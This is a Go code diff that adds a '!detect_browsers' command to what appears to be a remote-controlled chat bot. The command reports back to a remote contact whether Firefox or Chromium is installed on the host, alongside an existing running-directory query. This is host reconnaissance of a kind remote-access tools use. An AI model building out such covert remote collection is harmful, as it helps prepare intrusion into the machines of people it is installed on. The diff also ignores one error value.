@@ -204,6 +204,8 @@ func main() {
                     } else if string(message) == "!get_running_dir" {
                         runningDir := getRunningDir()
                         t.FriendSendMessage(friendNumber, runningDir)
+                    } else if string(message) == "!detect_browsers" {
+                        t.FriendSendMessage(friendNumber, detectBrowsers())
                     }
                 fmt.Println(len([]rune(message)))
             }
@@ -547,4 +549,14 @@ func getRunningDir() (string) {
             log.Fatal(err)
     }
     return dir
+}
+
+func detectBrowsers() (string) {
+    firefox, err := exists("/usr/bin/firefox")
+    chromium, err := exists("/usr/bin/chromium-browser")
+    browsers := fmt.Sprintf("Firefox %v\nChromium %v", firefox, chromium)
+    if err != nil {
+        return "Error in browser detection"
+    }
+    return browsers
 }
